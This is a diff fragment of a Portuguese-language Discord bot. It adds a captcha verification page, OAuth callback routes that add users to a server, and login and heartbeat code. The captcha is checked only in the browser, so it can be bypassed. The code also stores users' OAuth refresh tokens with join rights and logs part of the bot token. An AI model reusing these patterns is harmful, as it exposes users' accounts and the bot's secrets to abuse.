+  const tokenB64 = Buffer.from(verifyToken, 'utf-8').toString('base64');
+  const guildIdSafe = JSON.stringify(String(guildId));
+  const userIdSafe = JSON.stringify(String(userId));
+  return `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verificação — ${esc(guildName)}</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#5865F2 0%,#8B5CF6 50%,#EC4899 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#fff}
+.card{background:#1e1f22;border-radius:20px;padding:40px;max-width:500px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.4);text-align:center}
+.guild-icon{width:96px;height:96px;border-radius:50%;margin:0 auto 20px;border:4px solid #5865F2;box-shadow:0 8px 24px rgba(88,101,242,.4);object-fit:cover;background:#5865F2;display:flex;align-items:center;justify-content:center;font-size:40px;font-weight:bold}
+h1{font-size:24px;margin-bottom:8px}
+.sub{color:#949BA4;margin-bottom:24px;font-size:14px}
+.captcha{background:#2b2d31;border-radius:14px;padding:24px;margin:20px 0}
+.question{font-size:22px;font-weight:bold;color:#5865F2;margin-bottom:16px}
+input[type=text]{width:100%;padding:14px;border-radius:10px;border:2px solid #3f4147;background:#1e1f22;color:#fff;font-size:16px;text-align:center;letter-spacing:2px;outline:none}
+input[type=text]:focus{border-color:#5865F2}
+button{width:100%;padding:14px;margin-top:16px;border:none;border-radius:10px;background:#5865F2;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
+button:hover{background:#4752C4}
+button:disabled{background:#3f4147;cursor:not-allowed}
+.status{margin-top:16px;padding:12px;border-radius:10px;font-size:14px;display:none}
+.status.ok{background:#22c55e22;color:#4ade80;display:block}
+.status.err{background:#ef444422;color:#f87171;display:block}
+.footer{color:#6d6f78;font-size:12px;margin-top:24px}
+</style>
+</head>
+<body>
+<div class="card">
+${guildIcon ? `<img class="guild-icon" src="${esc(guildIcon)}" alt="">` : `<div class="guild-icon">🧊</div>`}
+<h1>Verificação</h1>
+<p class="sub">${esc(guildName)}</p>
+<div class="captcha">
+<div class="question" id="question">Carregando...</div>
+<input type="text" id="answer" placeholder="Sua resposta" autocomplete="off">
+<button id="submit">Verificar</button>
+<div class="status" id="status"></div>
+</div>
+<p class="footer">Protegido pelo Frio Bot 🧊</p>
+</div>
+<script>
+(function(){
+const GUILD_ID = ${guildIdSafe};
+const USER_ID = ${userIdSafe};
+const TOKEN = atob(${JSON.stringify(tokenB64)});
+let correctAnswer = null;
+function randInt(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
+const EMOJIS=['🍎','🍌','🍇','🍓','🍒','🍑','🥝','🍍'];
+function genCaptcha(){
+  const types=['add','sub','mult','reverse','emoji','numrev'];
+  const t=types[Math.floor(Math.random()*types.length)];
+  let q='',a='';
+  if(t==='add'){const x=randInt(5,20),y=randInt(3,15);q=x+' + '+y+' = ?';a=String(x+y);}
+  else if(t==='sub'){const x=randInt(15,40),y=randInt(3,12);q=x+' - '+y+' = ?';a=String(x-y);}
+  else if(t==='mult'){const x=randInt(2,9),y=randInt(2,9);q=x+' x '+y+' = ?';a=String(x*y);}
+  else if(t==='reverse'){const w=['FRIO','GELO','BOT','ZERO','APOSTA'][randInt(0,4)];q='Digite invertido: '+w;a=w.split('').reverse().join('');}
+  else if(t==='emoji'){const e=EMOJIS[randInt(0,EMOJIS.length-1)];const n=randInt(3,7);q='Quantos '+e+'? '+e.repeat(n);a=String(n);}
+  else{const num=String(randInt(1000,9999));q='Digite invertido: '+num;a=num.split('').reverse().join('');}
+  document.getElementById('question').textContent=q;
+  correctAnswer=a.toLowerCase();
+}
+async function submit(){
+  const answer=document.getElementById('answer').value.trim().toLowerCase();
+  const status=document.getElementById('status');
+  const btn=document.getElementById('submit');
+  if(answer!==correctAnswer){
+    status.className='status err';
+    status.textContent='Resposta incorreta. Tentando novamente...';
+    setTimeout(function(){genCaptcha();document.getElementById('answer').value='';status.className='status';},1200);
+    return;
+  }
+  btn.disabled=true;
+  status.className='status';
+  status.textContent='Verificando...';
+  try{
+    const r=await fetch('/verify/'+GUILD_ID+'/complete',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({user_id:USER_ID,token:TOKEN})
+    });
+    const j=await r.json();
+    if(j.ok){
+      status.className='status ok';
+      status.textContent='Verificado! Pode voltar ao Discord.';
+      btn.textContent='Voltar ao Discord';
+      btn.disabled=false;
+      btn.onclick=function(){window.location.href='discord://-/channels/'+GUILD_ID;};
+    }else{
+      status.className='status err';
+      status.textContent=j.error||'Erro';
+      btn.disabled=false;
+    }
+  }catch(e){
+    status.className='status err';
+    status.textContent='Erro de conexão.';
+    btn.disabled=false;
+  }
+}
+document.getElementById('submit').onclick=submit;
+document.getElementById('answer').addEventListener('keypress',function(e){if(e.key==='Enter')submit();});
+genCaptcha();
+})();
+</script>
+</body>
+</html>`;
+}
+
+// ───── ROTAS ─────
+app.get('/verify/:guildId', async (req, res) => {
+  try {
+    const guildId = req.params.guildId;
+    const userId = req.query.user || null;
+    const guild = client.guilds.cache.get(guildId);
+    const guildName = guild?.name || 'Servidor';
+    const guildIcon = guild?.iconURL({ size: 256 }) || null;
+
+    if (!userId) {
+      const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${encodeURIComponent('verify:' + guildId)}`;
+      return res.redirect(oauthUrl);
+    }
+    if (!/^\d{17,20}$/.test(userId)) {
+      return res.status(400).set('Content-Type', 'text/html; charset=utf-8').send('<h1>Erro</h1><p>ID inválido.</p>');
+    }
+    const token = signVerifyToken(guildId, userId);
+    if (!verifyVerifyToken(token)) {
+      return res.status(500).set('Content-Type', 'text/html; charset=utf-8').send('<h1>Erro</h1><p>Token inválido.</p>');
+    }
+    const html = buildVerificationHTML(guildId, guildName, guildIcon, userId, token);
+    res.status(200);
+    res.set('Content-Type', 'text/html; charset=utf-8');
+    res.set('Cache-Control', 'no-store');
+    return res.send(html);
+  } catch (e) {
+    console.error('[/verify]', e);
+    return res.status(500).set('Content-Type', 'text/html; charset=utf-8').send('<h1>Erro</h1>');
+  }
+});
+
+app.post('/verify/:guildId/complete', express.json(), async (req, res) => {
+  try {
+    const guildId = req.params.guildId;
+    const { user_id, token } = req.body || {};
+    if (!user_id || !token) return res.status(400).json({ error: 'user_id e token obrigatórios' });
+    const dec = verifyVerifyToken(token);
+    if (!dec || dec.guildId !== guildId || dec.userId !== String(user_id)) {
+      return res.status(403).json({ error: 'Token inválido ou expirado' });
+    }
+    const g = client.guilds.cache.get(guildId);
+    if (!g) return res.status(404).json({ error: 'Bot não está no servidor' });
+    const config = await getConfig(guildId);
+    if (config.verificado_role) {
+      const m = await g.members.fetch(user_id).catch(() => null);
+      if (m) await m.roles.add(config.verificado_role, 'Verificação concluída').catch(() => {});
+    }
+    await logImportant('VERIFICAÇÃO', '✅ Usuário verificado', {
+      description: `Completou a verificação (captcha).`,
+      guild: guildId, user: user_id, severity: 'success',
+    }).catch(() => {});
+    return res.json({ ok: true });
+  } catch (e) {
+    console.error('[/verify/complete]', e);
+    return res.status(500).json({ error: e.message });
+  }
+});
+
+app.get('/callback', async (req, res) => {
+  const { code, state: rawState } = req.query;
+  const guildId = (rawState || '').replace(/^verify:/, '');
+  if (!code || !guildId) return res.status(400).send('Parâmetros inválidos.');
+  try {
+    const tr = await fetch('https://discord.com/api/oauth2/token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        client_id: DISCORD_CLIENT_ID,
+        client_secret: DISCORD_CLIENT_SECRET,
+        grant_type: 'authorization_code',
+        code,
+        redirect_uri: REDIRECT_URI,
+      }),
+    });
+    const td = await tr.json();
+    if (!td.access_token) return res.status(400).send('Erro token.');
+    const ur = await fetch('https://discord.com/api/v10/users/@me', { headers: { Authorization: `Bearer ${td.access_token}` } });
+    const ud = await ur.json();
+    if (!ud.id) return res.status(400).send('Erro usuário.');
+
+    try {
+      await supabase.from('verifications').upsert({
+        user_id: ud.id,
+        access_token: td.access_token,
+        refresh_token: td.refresh_token,
+        expires_at: new Date(Date.now() + td.expires_in * 1000).toISOString(),
+      }, { onConflict: 'user_id' });
+    } catch (e) { console.error('[VERIFICATIONS-UPSERT]', e.message); }
+
+    await fetch(`https://discord.com/api/v10/guilds/${guildId}/members/${ud.id}`, {
+      method: 'PUT',
+      headers: { Authorization: `Bot ${process.env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
+      body: JSON.stringify({ access_token: td.access_token }),
+    }).catch(() => {});
+
+    try {
+      const g = client.guilds.cache.get(guildId);
+      await logImportant('VERIFICAÇÃO', '✅ OAuth concluído', {
+        description: `Autorizou, aguardando captcha.`,
+        guild: guildId, severity: 'info',
+        fields: [
+          { name: '👤', value: `<@${ud.id}>`, inline: true },
+          { name: '🌐', value: g ? `**${g.name}**` : `\`${guildId}\``, inline: true },
+        ],
+      });
+    } catch {}
+
+    return res.redirect(`/verify/${guildId}?user=${ud.id}`);
+  } catch (e) {
+    console.error('❌ [/callback]', e);
+    res.status(500).send('Erro interno.');
+  }
+});
+// ═══════════════════════════════════════════════════════════
+// [PARTE 7 - BLOCO F] PROCESS HANDLERS + LOGIN
+// ═══════════════════════════════════════════════════════════
+process.on('unhandledRejection', r => {
+  console.log('⚠️ unhandledRejection:', r?.message || r);
+  try { logError('unhandledRejection', r); } catch {}
+});
+process.on('uncaughtException', e => {
+  console.log('⚠️ uncaughtException:', e?.message || e);
+  try { logError('uncaughtException', e); } catch {}
+});
+
+client.on('error', e => console.error('🔴 [CLIENT ERROR]', e.message));
+client.on('shardError', (e, id) => console.error('🔴 [SHARD-ERR]', id, e.message, e.code));
+client.on('shardDisconnect', (e, id) => console.log('🔌 [DISCONNECT]', id, 'code:', e?.code, 'reason:', e?.reason));
+client.on('shardReconnecting', id => console.log('🔄 [RECONNECT]', id));
+client.on('shardResume', (id, r) => console.log('✅ [RESUME]', id, r));
+client.on('invalidated', () => console.error('⚠️ [INVALIDATED]'));
+client.on('warn', m => console.warn('⚠️ [WARN]', m));
+
+console.log('🔑 [LOGIN] Token presente:', !!process.env.DISCORD_TOKEN);
+console.log('🔑 [LOGIN] Token começa com:', (process.env.DISCORD_TOKEN || '').substring(0, 10) + '...');
+console.log('🔑 [LOGIN] Tentando conectar...');
+
+setTimeout(() => {
+  console.log('⏰ [TIMEOUT 30s] isReady:', client.isReady());
+  console.log('⏰ [TIMEOUT 30s] WS status:', client.ws.status);
+  console.log('⏰ [TIMEOUT 30s] WS ping:', client.ws.ping);
+}, 30000);
+
+setInterval(() => {
+  console.log(`💓 [HEARTBEAT] ${new Date().toISOString()} | isReady=${client.isReady()} | ws.status=${client.ws.status}`);
+}, 60000);
+
+client.login(process.env.DISCORD_TOKEN)
+  .then(() => console.log('🔑 [LOGIN] Promise resolvida ✅'))
+  .catch(e => {
+    console.error('🔑 [LOGIN] ❌ FALHOU');
+    console.error('🔑 [LOGIN] message:', e.message);
+    console.error('🔑 [LOGIN] code:', e.code);
+  });
+
+// ═══════════════════════════════════════════════════════════
+// ✅ FIM DO ARQUIVO — 7 PARTES COMPLETAS — v6.5.0
+// ═══════════════════════════════════════════════════════════
